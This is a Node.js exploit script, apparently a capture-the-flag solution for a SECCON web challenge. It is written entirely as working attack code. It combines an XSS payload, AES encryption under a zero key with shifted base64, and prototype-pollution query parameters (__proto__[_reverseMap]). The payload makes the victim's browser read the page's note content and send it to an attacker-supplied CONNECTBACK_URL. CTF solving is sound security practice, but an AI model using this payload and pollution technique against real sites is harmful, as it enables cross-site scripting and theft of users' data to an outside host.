const CryptoJS = require("crypto-js");
const SECCON_HOST =
  process.env.SECCON_HOST ?? fail("No SECCON_HOST");
const WEB_PORT = "3000";
const CONNECTBACK_URL =
  process.env.CONNECTBACK_URL ?? fail("No CONNECTBACK_URL");

const encryptNote = ({ plaintext, key }) => {
  const keyArray = CryptoJS.enc.Base64.parse(key);
  const ivArray = CryptoJS.lib.WordArray.random(16);
  // const saltArray = CryptoJS.lib.WordArray.random(16);
  const ciphertextArray = CryptoJS.AES.encrypt(plaintext, keyArray, {
    iv: ivArray, 
    // salt: saltArray, 
  }).ciphertext;
  return {
    iv: ivArray.toString(CryptoJS.enc.Base64), 
    ciphertext: ciphertextArray.toString(CryptoJS.enc.Base64), 
  }
}

const exploit = async () => {
  const payload = `<img src onerror='w=window.open("/");setTimeout(()=>{location.href="${CONNECTBACK_URL}flag?FLAG="+w.document.getElementById("note").innerHTML},2000)'>`;
  const key = new CryptoJS.lib.WordArray.init([0, 0, 0, 0]).toString(CryptoJS.enc.Base64);
  const { iv, ciphertext } = encryptNote({key, plaintext: payload});

  const SHIFT_INDEX = 100;
  const craftedCiphertext = [...ciphertext].map((c) => c === "=" ? "" : String.fromCharCode(c.charCodeAt(0) + SHIFT_INDEX)).join("");
  const craftedIv = [...iv].map((c) => c === "=" ? "" : String.fromCharCode(c.charCodeAt(0) + SHIFT_INDEX)).join("");

  const map = [...'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/'].map((c) => String.fromCharCode(c.charCodeAt(0) + SHIFT_INDEX)).join("")+"=";
  const reverseMap = {}
  for (var j = 0; j < map.length; j++) {
    reverseMap[map.charCodeAt(j)] = j;
  }

  const queries = Object.entries(reverseMap).map(([k, v]) => `__proto__[_reverseMap][${k}]=${v}`).join("&");

  const {id} = await fetch(`http://${SECCON_HOST}:${WEB_PORT}/note`, {
    method: "POST", 
    body: JSON.stringify({
      iv: craftedIv, 
      ciphertext: craftedCiphertext
    }), 
    headers: {
      "content-type": "application/json"
    }
  }).then(r => r.json());
  return `http://web:3000/?id=${id}&${queries}`;
}

module.exports = { exploit };
